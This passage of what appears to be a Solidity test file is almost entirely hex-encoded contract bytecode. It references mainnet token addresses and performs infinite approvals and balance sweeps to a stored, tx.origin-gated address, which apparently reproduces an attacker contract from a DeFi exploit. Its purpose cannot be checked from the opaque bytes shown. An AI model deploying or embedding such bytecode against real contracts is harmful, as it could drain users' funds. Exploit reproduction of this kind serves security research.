            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600c6000",
            hex"9054906101000a900473ffffffffffffffffffffffffffffffffffffffff167f",
            hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"6040518363ffffffff1660e01b81526004016200219e9291906200301d565b60",
            hex"0060405180830381600087803b158015620021b957600080fd5b505af1158015",
            hex"620021ce573d6000803e3d6000fd5b5050505060008054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff1663095ea7b3600c60009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffff",
            hex"ffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b",
            hex"8152600401620022719291906200301d565b600060405180830381600087803b",
            hex"1580156200228c57600080fd5b505af1158015620022a1573d6000803e3d6000",
            hex"fd5b50505050565b6000600c60009054906101000a900473ffffffffffffffff",
            hex"ffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffff",
            hex"ffff1663c1919dd9600d60009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff166040518263ffffffff1660e01b8152600401620023",
            hex"28919062002b17565b606060405180830381865afa15801562002346573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"906200236c919062003518565b9050600d60009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffff",
            hex"ffffffffffffff1663a9059cbb60118460068110620023c357620023c2620030",
            hex"4a565b5b0160009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff16836020015184602001518560000151620024009190620035a856",
            hex"5b6200240c9190620035e0565b6040518363ffffffff1660e01b815260040162",
            hex"00242b9291906200301d565b600060405180830381600087803b158015620024",
            hex"4657600080fd5b505af11580156200245b573d6000803e3d6000fd5b50505050",
            hex"601182600681106200247657620024756200304a565b5b016000905490610100",
            hex"0a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffff",
            hex"ffffffffffffffffffffffffffff1663e68d35696040518163ffffffff1660e0",
            hex"1b8152600401600060405180830381600087803b158015620024e057600080fd",
            hex"5b505af1158015620024f5573d6000803e3d6000fd5b505050505050565b6128",
            hex"43806200361c83390190565b6000604051905090565b600080fd5b600080fd5b",
            hex"600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b",
            hex"60006200254c826200251f565b9050919050565b6200255e816200253f565b81",
            hex"146200256a57600080fd5b50565b6000813590506200257e8162002553565b92",
            hex"915050565b6000819050919050565b620025998162002584565b8114620025a5",
            hex"57600080fd5b50565b600081359050620025b9816200258e565b92915050565b",
            hex"600080fd5b600080fd5b600080fd5b60008083601f840112620025e757620025",
            hex"e6620025bf565b5b8235905067ffffffffffffffff8111156200260757620026",
            hex"06620025c4565b5b602083019150836001820283011115620026265762002625",
            hex"620025c9565b5b9250929050565b600080600080600060808688031215620026",
            hex"4c576200264b62002515565b5b60006200265c888289016200256d565b955050",
            hex"60206200266f888289016200256d565b94505060406200268288828901620025",
            hex"a8565b935050606086013567ffffffffffffffff811115620026a657620026a5",
            hex"6200251a565b5b620026b488828901620025ce565b9250925050929550929590",
            hex"9350565b60007fffffffff000000000000000000000000000000000000000000",
            hex"0000000000000082169050919050565b620026fa81620026c3565b8252505056",
            hex"5b6000602082019050620027176000830184620026ef565b92915050565b6000",
            hex"8083601f840112620027365762002735620025bf565b5b8235905067ffffffff",
            hex"ffffffff811115620027565762002755620025c4565b5b602083019150836020",
            hex"820283011115620027755762002774620025c9565b5b9250929050565b600080",
            hex"83601f840112620027955762002794620025bf565b5b8235905067ffffffffff",
            hex"ffffff811115620027b557620027b4620025c4565b5b60208301915083602082",
            hex"0283011115620027d457620027d3620025c9565b5b9250929050565b60008060",
            hex"0080600080600080600060a08a8c0312156200280057620027ff62002515565b",
            hex"5b60008a013567ffffffffffffffff8111156200282157620028206200251a56",
            hex"5b5b6200282f8c828d016200271d565b995099505060208a013567ffffffffff",
            hex"ffffff8111156200285557620028546200251a565b5b620028638c828d016200",
            hex"277c565b975097505060408a013567ffffffffffffffff811115620028895762",
            hex"0028886200251a565b5b620028978c828d016200277c565b9550955050606062",
            hex"0028ac8c828d016200256d565b93505060808a013567ffffffffffffffff8111",
            hex"15620028d057620028cf6200251a565b5b620028de8c828d01620025ce565b92",
            hex"509250509295985092959850929598565b60008115159050919050565b620029",
            hex"0781620028f0565b82525050565b600060208201905062002924600083018462",
            hex"0028fc565b92915050565b600060208284031215620029435762002942620025",
            hex"15565b5b600062002953848285016200256d565b91505092915050565b600081",
            hex"9050919050565b62002971816200295c565b81146200297d57600080fd5b5056",
            hex"5b600081359050620029918162002966565b92915050565b6000806000806060",
            hex"8587031215620029b457620029b362002515565b5b6000620029c48782880162",
            hex"002980565b9450506020620029d78782880162002980565b9350506040850135",
            hex"67ffffffffffffffff811115620029fb57620029fa6200251a565b5b62002a09",
            hex"87828801620025ce565b925092505092959194509250565b6000828252602082",
            hex"01905092915050565b50565b600062002a3a60008362002a17565b915062002a",
            hex"478262002a28565b600082019050919050565b60006020820190508181036000",
            hex"83015262002a6d8162002a2b565b9050919050565b600081519050919050565b",
            hex"600081905092915050565b60005b8381101562002aaa57808201518184015260",
            hex"208101905062002a8d565b60008484015250505050565b600062002ac3826200",
            hex"2a74565b62002acf818562002a7f565b935062002ae181856020860162002a8a",
            hex"565b80840191505092915050565b600062002afb828462002ab6565b91508190",
            hex"5092915050565b62002b11816200253f565b82525050565b6000602082019050",
            hex"62002b2e600083018462002b06565b92915050565b60008151905062002b4581",
            hex"6200258e565b92915050565b60006020828403121562002b645762002b636200",
            hex"2515565b5b600062002b748482850162002b34565b91505092915050565b6200",
            hex"2b888162002584565b82525050565b600060208201905062002ba56000830184",
            hex"62002b7d565b92915050565b7f4e487b71000000000000000000000000000000",
            abi.encode(address(0x00600052602160045260246000Fd5B6000819050)),
            hex"919050565b6000819050919050565b600062002c0f62002c0962002c03846200",
            hex"2bda565b62002be4565b62002584565b9050919050565b62002c218162002bee",
            hex"565b82525050565b6000819050919050565b600062002c5262002c4c62002c46",
            hex"8462002c27565b62002be4565b62002584565b9050919050565b62002c648162",
            hex"002c31565b82525050565b62002c758162002584565b82525050565b60a08201",
            hex"600082015162002c93600085018262002c6a565b50602082015162002ca86020",
            hex"85018262002c6a565b50604082015162002cbd604085018262002c6a565b5060",
            hex"6082015162002cd2606085018262002c6a565b50608082015162002ce7608085",
            hex"018262002c6a565b50505050565b62002cf8816200253f565b82525050565b60",
            hex"04811062002d125762002d1162002bab565b5b50565b600081905062002d2582",
            hex"62002cfe565b919050565b600062002d378262002d15565b9050919050565b62",
            hex"002d498162002d2a565b82525050565b60008282526020820190509291505056",
            hex"5b6000601f19601f8301169050919050565b600062002d7e8262002a74565b62",
            hex"002d8a818562002d4f565b935062002d9c81856020860162002a8a565b62002d",
            hex"a78162002d60565b840191505092915050565b62002dbd81620028f0565b8252",
            hex"5050565b600060808301600083015162002ddd600086018262002d3e565b5060",
            hex"2083015162002df2602086018262002ced565b50604083015184820360408601",
            hex"5262002e0c828262002d71565b915050606083015162002e2360608601826200",
            hex"2db2565b508091505092915050565b600060c08301600083015162002e486000",
            hex"86018262002ced565b50602083015162002e5d602086018262002c6a565b5060",
            hex"4083015162002e72604086018262002ced565b50606083015162002e87606086",
            hex"018262002ced565b50608083015162002e9c608086018262002ced565b5060a0",
            hex"83015184820360a086015262002eb6828262002dc3565b915050809150509291",
            hex"5050565b60006101208201905062002edb600083018862002c16565b62002eea",
            hex"602083018762002c59565b62002ef9604083018662002c7b565b81810360e083",
            hex"015262002f0d818562002e2e565b905062002f1f610100830184620028fc565b",
            hex"9695505050505050565b600060408201905062002f40600083018562002c1656",
            hex"5b62002f4f602083018462002b7d565b9392505050565b600080604083850312",
            hex"1562002f705762002f6f62002515565b5b600062002f808582860162002b3456",
            hex"5b925050602062002f938582860162002b34565b9150509250929050565b6000",
            hex"819050919050565b600062002fc862002fc262002fbc8462002f9d565b62002b",
            hex"e4565b62002584565b9050919050565b62002fda8162002fa7565b8252505056",
            hex"5b600060608201905062002ff7600083018662002b7d565b6200300660208301",
            hex"8562002b06565b62003015604083018462002fcf565b949350505050565b6000",
            hex"60408201905062003034600083018562002b06565b6200304360208301846200",
            hex"2b7d565b9392505050565b7f4e487b7100000000000000000000000000000000",
            abi.encode(address(0x600052603260045260246000Fd5b600081905091)),
            hex"9050565b600068ffffffffffffffffff82169050919050565b6000620030b962",
            hex"0030b3620030ad8462003079565b62002be4565b62003083565b905091905056",
            hex"5b620030cb8162003098565b82525050565b6000602082019050620030e86000",
            hex"830184620030c0565b92915050565b6000606082019050620031056000830186",
            hex"62002b7d565b62003114602083018562002b06565b6200312360408301846200",
            hex"2b7d565b949350505050565b6000815190506200313c8162002553565b929150",
            hex"50565b6000602082840312156200315b576200315a62002515565b5b60006200",
            hex"316b848285016200312b565b91505092915050565b7f4e487b71000000000000",
            hex"0000000000000000000000000000000000000000000060005260416004526024",
            hex"6000fd5b600081519050919050565b600082825260208201905092915050565b",
            hex"6000819050602082019050919050565b6000620031dd838362002ced565b6020",
            hex"8301905092915050565b6000602082019050919050565b600062003203826200",
            hex"31a3565b6200320f8185620031ae565b93506200321c83620031bf565b806000",
            hex"5b8381101562003253578151620032378882620031cf565b9750620032448362",
            hex"0031e9565b92505060018101905062003220565b508593505050509291505056",
            hex"5b600081519050919050565b600082825260208201905092915050565b600081",
            hex"9050602082019050919050565b60006200329a838362002c6a565b6020830190",
            hex"5092915050565b6000602082019050919050565b6000620032c0826200326056",
            hex"5b620032cc81856200326b565b9350620032d9836200327c565b8060005b8381",
            hex"101562003310578151620032f488826200328c565b97506200330183620032a6",
            hex"565b925050600181019050620032dd565b5085935050505092915050565b6000",
            hex"82825260208201905092915050565b60006200333b8262002a74565b62003347",
            hex"81856200331d565b93506200335981856020860162002a8a565b620033648162",
            hex"002d60565b840191505092915050565b600061ffff82169050919050565b6000",
            hex"6200339e62003398620033928462002c27565b62002be4565b6200336f565b90",
            hex"50919050565b620033b0816200337d565b82525050565b600060e08201905062",
            hex"0033cd600083018a62002b06565b8181036020830152620033e18189620031f6",
            hex"565b90508181036040830152620033f78188620032b3565b9050818103606083",
            hex"01526200340d8187620032b3565b90506200341e608083018662002b06565b81",
            hex"810360a08301526200343281856200332e565b90506200344360c08301846200",
            hex"33a5565b98975050505050505050565b600080fd5b6200345f8262002d60565b",
            hex"810181811067ffffffffffffffff821117156200348157620034806200317456",
            hex"5b5b80604052505050565b6000620034966200250b565b9050620034a4828262",
            hex"003454565b919050565b600060608284031215620034c257620034c16200344f",
            hex"565b5b620034ce60606200348a565b90506000620034e08482850162002b3456",
            hex"5b6000830152506020620034f68482850162002b34565b602083015250604062",
            hex"00350c8482850162002b34565b60408301525092915050565b60006060828403",
            hex"121562003531576200353062002515565b5b60006200354184828501620034a9",
            hex"565b91505092915050565b7f4e487b7100000000000000000000000000000000",
            abi.encode(address(0x600052601260045260246000fd5B7F4e487B7100)),
            hex"0000000000000000000000000000000000000000000000000000006000526011",
            hex"60045260246000fd5b6000620035b58262002584565b9150620035c283620025",
            hex"84565b925082620035d557620035d46200354a565b5b82820490509291505056",
            hex"5b6000620035ed8262002584565b9150620035fa8362002584565b9250828201",
            hex"90508082111562003615576200361462003579565b5b9291505056fe60806040",
            hex"5273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc26000806101000a815481",
            hex"73ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffff",
            hex"ffffffffffffffffffffffffffffff16021790555073ae7ab96520de3a18e5e1",
            hex"11b5eaab095312d7fe84600160006101000a81548173ffffffffffffffffffff",
            hex"ffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffff",
            hex"ffffffff160217905550737f39c581f595b53c5cb19bd0b3f8da6c935e2ca060",
            hex"0260006101000a81548173ffffffffffffffffffffffffffffffffffffffff02",
            hex"1916908373ffffffffffffffffffffffffffffffffffffffff16021790555073",
            hex"6b175474e89094c44da98b954eedeac495271d0f600360006101000a81548173",
            hex"ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffff",
            hex"ffffffffffffffffffffffffffff16021790555073a0b86991c6218b36c1d19d",
            hex"4a2e9eb0ce3606eb48600460006101000a81548173ffffffffffffffffffffff",
            hex"ffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffff",
            hex"ffffff16021790555073dac17f958d2ee523a2206206994597c13d831ec76005",
            hex"60006101000a81548173ffffffffffffffffffffffffffffffffffffffff0219",
            hex"16908373ffffffffffffffffffffffffffffffffffffffff1602179055507332",
            hex"e0a7f7c4b1a19594d25bd9b63eba912b1a5f61600660006101000a81548173ff",
            hex"ffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffff",
            hex"ffffffffffffffffffffffffff1602179055507337e49bf3749513a02fa535f0",
            hex"cbc383796e8107e4600760006101000a81548173ffffffffffffffffffffffff",
            hex"ffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffff",
            hex"ffff16021790555073b40b073d7e47986d3a45ca7fd30772c25a2ad57f600860",
            hex"006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916",
            hex"908373ffffffffffffffffffffffffffffffffffffffff16021790555073b90c",
            hex"f1d740b206b6d80854bc525e609dc42b45dc600960006101000a81548173ffff",
            hex"ffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffff",
            hex"ffffffffffffffffffffffff1602179055503480156200036257600080fd5b50",
            hex"600660009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff1673ffffffffffffffffffffffffffffffffffffffff1663c814d2d16040",
            hex"518163ffffffff1660e01b81526004016020604051808303816000875af11580",
            hex"15620003d3573d6000803e3d6000fd5b505050506040513d601f19601f820116",
            hex"82018060405250810190620003f9919062000445565b600a8190555062000477",
            hex"565b600080fd5b6000819050919050565b6200041f816200040a565b81146200",
            hex"042b57600080fd5b50565b6000815190506200043f8162000414565b92915050",
            hex"565b6000602082840312156200045e576200045d62000405565b5b6000620004",
            hex"6e848285016200042e565b91505092915050565b6123bc806200048760003960",
            hex"00f3fe6080604052600436106100385760003560e01c8063150b7a0214610044",
            hex"578063e68d356914610081578063f4c35aae146100985761003f565b3661003f",
            hex"57005b600080fd5b34801561005057600080fd5b5061006b6004803603810190",
            hex"6100669190611ec9565b6100c1565b6040516100789190611f8c565b60405180",
            hex"910390f35b34801561008d57600080fd5b506100966100d6565b005b34801561",
            hex"00a457600080fd5b506100bf60048036038101906100ba9190611fa7565b6105",
            hex"56565b005b600063150b7a0260e01b905095945050505050565b600860009054",
            hex"906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffff",
            hex"ffffffffffffffffffffffffffffffffffff1663095ea7b36007600090549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffff",
            hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffffff60405183",
            hex"63ffffffff1660e01b8152600401610175929190611ff2565b60006040518083",
            hex"0381600087803b15801561018f57600080fd5b505af11580156101a3573d6000",
            hex"803e3d6000fd5b505050506000600760009054906101000a900473ffffffffff",
            hex"ffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffff",
            hex"ffffffffff1663c1919dd9600860009054906101000a900473ffffffffffffff",
            hex"ffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401",
            hex"610226919061201b565b606060405180830381865afa158015610243573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"906102679190612140565b905060008160200151826020015183600001516102",
            hex"8491906121cb565b61028e91906121fc565b9050600760009054906101000a90",
            hex"0473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffff",
            hex"ffffffffffffffffffffffff1663d30f6292600a54600860009054906101000a",
            hex"900473ffffffffffffffffffffffffffffffffffffffff16846040518463ffff",
            hex"ffff1660e01b815260040161031393929190612230565b602060405180830381",
            hex"6000875af1158015610332573d6000803e3d6000fd5b505050506040513d601f",
            hex"19601f820116820180604052508101906103569190612267565b506103608161",
            hex"06bb565b600760009054906101000a900473ffffffffffffffffffffffffffff",
            hex"ffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166377cf",
            hex"d4a5600a54600860009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1660016040518463ffffffff1660e01b81526004016103e493",
            hex"9291906122d9565b6020604051808303816000875af1158015610403573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"906104279190612267565b50600860009054906101000a900473ffffffffffff",
            hex"ffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffff",
            hex"ffffffff1663a9059cbb33600860009054906101000a900473ffffffffffffff",
            hex"ffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffff",
            hex"ffffff166370a08231306040518263ffffffff1660e01b81526004016104c291",
            hex"9061201b565b602060405180830381865afa1580156104df573d6000803e3d60",
            hex"00fd5b505050506040513d601f19601f82011682018060405250810190610503",
            hex"9190612267565b6040518363ffffffff1660e01b815260040161052092919061",
            hex"1ff2565b600060405180830381600087803b15801561053a57600080fd5b505a",
            hex"f115801561054e573d6000803e3d6000fd5b505050505050565b600960009054",
            hex"906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffff",
            hex"ffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffff",
            hex"ffffffffffffffffff16146105b057600080fd5b8073ffffffffffffffffffff",
            hex"ffffffffffffffffffff1663a9059cbb600960009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffff",
            hex"ffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260",
            hex"0401610628919061201b565b602060405180830381865afa158015610645573d",
            hex"6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250",
            hex"8101906106699190612267565b6040518363ffffffff1660e01b815260040161",
            hex"0686929190611ff2565b600060405180830381600087803b1580156106a05760",
            hex"0080fd5b505af11580156106b4573d6000803e3d6000fd5b5050505050565b60",
            hex"00600760009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff16632ab88d1c60",
            hex"0260009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff166040518263ffffffff1660e01b815260040161073a919061201b565b6020",
            hex"60405180830381865afa158015610757573d6000803e3d6000fd5b5050505060",
            hex"40513d601f19601f8201168201806040525081019061077b9190612267565b11",
            hex"15610ddc57600560048060036002856107959190612310565b61079f91906123",
            hex"10565b6107a991906121cb565b6107b39190612310565b6107bd91906121cb56",
            hex"5b600760009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff16632ab88d1c60",
            hex"0260009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff166040518263ffffffff1660e01b815260040161083a919061201b565b6020",
            hex"60405180830381865afa158015610857573d6000803e3d6000fd5b5050505060",
            hex"40513d601f19601f8201168201806040525081019061087b9190612267565b11",
            hex"1561097657600760009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c7",
            hex"c5c4a7600a54600260009054906101000a900473ffffffffffffffffffffffff",
            hex"ffffffffffffffff16600560048060036002896108f99190612310565b610903",
            hex"9190612310565b61090d91906121cb565b6109179190612310565b6109219190",
            hex"6121cb565b6040518463ffffffff1660e01b815260040161093f939291906122",
            hex"30565b600060405180830381600087803b15801561095957600080fd5b505af1",
            hex"15801561096d573d6000803e3d6000fd5b50505050610cad565b600760009054",
            hex"906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffff",
            hex"ffffffffffffffffffffffffffffffffffff1663c7c5c4a7600a546008600090",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff166002",
            hex"600760009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff1673ffffffffffffffffffffffffffffffffffffffff16632ab88d1c6002",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"166040518263ffffffff1660e01b8152600401610a59919061201b565b602060",
            hex"405180830381865afa158015610a76573d6000803e3d6000fd5b505050506040",
            hex"513d601f19601f82011682018060405250810190610a9a9190612267565b6005",
            hex"600480600360028b610aae9190612310565b610ab89190612310565b610ac291",
            hex"906121cb565b610acc9190612310565b610ad691906121cb565b610ae0919061",
            hex"2352565b610aea91906121cb565b6040518463ffffffff1660e01b8152600401",
            hex"610b0893929190612230565b600060405180830381600087803b158015610b22",
            hex"57600080fd5b505af1158015610b36573d6000803e3d6000fd5b505050506007",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"1673ffffffffffffffffffffffffffffffffffffffff1663c7c5c4a7600a5460",
            hex"0260009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff16600760009054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff1673ffffffffffffffffffffffffffffffffffffffff16632ab88d1c",
            hex"600260009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff166040518263ffffffff1660e01b8152600401610c1b919061201b565b60",
            hex"2060405180830381865afa158015610c38573d6000803e3d6000fd5b50505050",
            hex"6040513d601f19601f82011682018060405250810190610c5c9190612267565b",
            hex"6040518463ffffffff1660e01b8152600401610c7a93929190612230565b6000",
            hex"60405180830381600087803b158015610c9457600080fd5b505af1158015610c",
            hex"a8573d6000803e3d6000fd5b505050505b600260009054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff1663a9059cbb33600260009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffff",
            hex"ffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004",
            hex"01610d47919061201b565b602060405180830381865afa158015610d64573d60",
            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
            hex"0190610d889190612267565b6040518363ffffffff1660e01b8152600401610d",
            hex"a5929190611ff2565b600060405180830381600087803b158015610dbf576000",
            hex"80fd5b505af1158015610dd3573d6000803e3d6000fd5b50505050611db9565b",
            hex"6000600760009054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff1673ffffffffffffffffffffffffffffffffffffffff16632ab88d1c",
            hex"60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"166040518263ffffffff1660e01b8152600401610e59919061201b565b602060",
            hex"405180830381865afa158015610e76573d6000803e3d6000fd5b505050506040",
            hex"513d601f19601f82011682018060405250810190610e9a9190612267565b1115",
            hex"611cd757600a600960046003600285610eb59190612310565b610ebf91906123",
            hex"10565b610ec991906121cb565b610ed39190612310565b610edd91906121cb56",
            hex"5b600760009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff16632ab88d1c60",
            hex"008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
            hex"6040518263ffffffff1660e01b8152600401610f58919061201b565b60206040",
            hex"5180830381865afa158015610f75573d6000803e3d6000fd5b50505050604051",
            hex"3d601f19601f82011682018060405250810190610f999190612267565b111561",
            hex"109357600760009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c7c5c4",
            hex"a7600a5460008054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff16600a6009600460036002896110169190612310565b611020919061",
            hex"2310565b61102a91906121cb565b6110349190612310565b61103e91906121cb",
            hex"565b6040518463ffffffff1660e01b815260040161105c93929190612230565b",
            hex"600060405180830381600087803b15801561107657600080fd5b505af1158015",
            hex"61108a573d6000803e3d6000fd5b50505050611bac565b600760009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffff",
            hex"ffffffffffffffffffffffffffffff1663c7c5c4a7600a546008600090549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff166002678ac7",
            hex"230489e80000600760009054906101000a900473ffffffffffffffffffffffff",
            hex"ffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663",
            hex"2ab88d1c60008054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff166040518263ffffffff1660e01b815260040161117d919061201b56",
            hex"5b602060405180830381865afa15801561119a573d6000803e3d6000fd5b5050",
            hex"50506040513d601f19601f820116820180604052508101906111be9190612267",
            hex"565b600a60096004600360028c6111d39190612310565b6111dd919061231056",
            hex"5b6111e791906121cb565b6111f19190612310565b6111fb91906121cb565b61",
            hex"12059190612352565b61120f9190612352565b61121991906121cb565b604051",
            hex"8463ffffffff1660e01b815260040161123793929190612230565b6000604051",
            hex"80830381600087803b15801561125157600080fd5b505af1158015611265573d",
            hex"6000803e3d6000fd5b50505050600760009054906101000a900473ffffffffff",
            hex"ffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffff",
            hex"ffffffffff1663c7c5c4a7600a5460008054906101000a900473ffffffffffff",
            hex"ffffffffffffffffffffffffffff16600760009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffff",
            hex"ffffffffffffff16632ab88d1c60008054906101000a900473ffffffffffffff",
            hex"ffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401",
            hex"611346919061201b565b602060405180830381865afa158015611363573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"906113879190612267565b6040518463ffffffff1660e01b81526004016113a5",
            hex"93929190612230565b600060405180830381600087803b1580156113bf576000",
            hex"80fd5b505af11580156113d3573d6000803e3d6000fd5b505050506007600090",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ff",
            hex"ffffffffffffffffffffffffffffffffffffff1663c7c5c4a7600a5460046000",
            hex"9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660",
            hex"0760009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff1673ffffffffffffffffffffffffffffffffffffffff16632ab88d1c600460",
            hex"009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
            hex"6040518263ffffffff1660e01b81526004016114b8919061201b565b60206040",
            hex"5180830381865afa1580156114d5573d6000803e3d6000fd5b50505050604051",
            hex"3d601f19601f820116820180604052508101906114f99190612267565b604051",
            hex"8463ffffffff1660e01b815260040161151793929190612230565b6000604051",
            hex"80830381600087803b15801561153157600080fd5b505af1158015611545573d",
            hex"6000803e3d6000fd5b50505050600760009054906101000a900473ffffffffff",
            hex"ffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffff",
            hex"ffffffffff1663c7c5c4a7600a54600560009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff16600760009054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff16632ab88d1c600560009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81",
            hex"5260040161162a919061201b565b602060405180830381865afa158015611647",
            hex"573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040",
            hex"525081019061166b9190612267565b6040518463ffffffff1660e01b81526004",
            hex"0161168993929190612230565b600060405180830381600087803b1580156116",
            hex"a357600080fd5b505af11580156116b7573d6000803e3d6000fd5b5050505060",
            hex"0760009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff1673ffffffffffffffffffffffffffffffffffffffff1663c7c5c4a7600a54",
            hex"600360009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff16600760009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632ab88d",
            hex"1c600360009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff166040518263ffffffff1660e01b815260040161179c919061201b565b",
            hex"602060405180830381865afa1580156117b9573d6000803e3d6000fd5b505050",
            hex"506040513d601f19601f820116820180604052508101906117dd919061226756",
            hex"5b6040518463ffffffff1660e01b81526004016117fb93929190612230565b60",
            hex"0060405180830381600087803b15801561181557600080fd5b505af115801561",
            hex"1829573d6000803e3d6000fd5b50505050600460009054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff1663a9059cbb33600460009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffff",
            hex"ffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004",
            hex"016118c7919061201b565b602060405180830381865afa1580156118e4573d60",
            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
            hex"01906119089190612267565b6040518363ffffffff1660e01b81526004016119",
            hex"25929190611ff2565b600060405180830381600087803b15801561193f576000",
            hex"80fd5b505af1158015611953573d6000803e3d6000fd5b505050506005600090",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ff",
            hex"ffffffffffffffffffffffffffffffffffffff1663a9059cbb33600560009054",
            hex"906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffff",
            hex"ffffffffffffffffffffffffffffffffffff166370a08231306040518263ffff",
            hex"ffff1660e01b81526004016119f1919061201b565b602060405180830381865a",
            hex"fa158015611a0e573d6000803e3d6000fd5b505050506040513d601f19601f82",
            hex"011682018060405250810190611a329190612267565b6040518363ffffffff16",
            hex"60e01b8152600401611a4f929190611ff2565b60006040518083038160008780",
            hex"3b158015611a6957600080fd5b505af1158015611a7d573d6000803e3d6000fd",
            hex"5b50505050600360009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9",
            hex"059cbb33600360009054906101000a900473ffffffffffffffffffffffffffff",
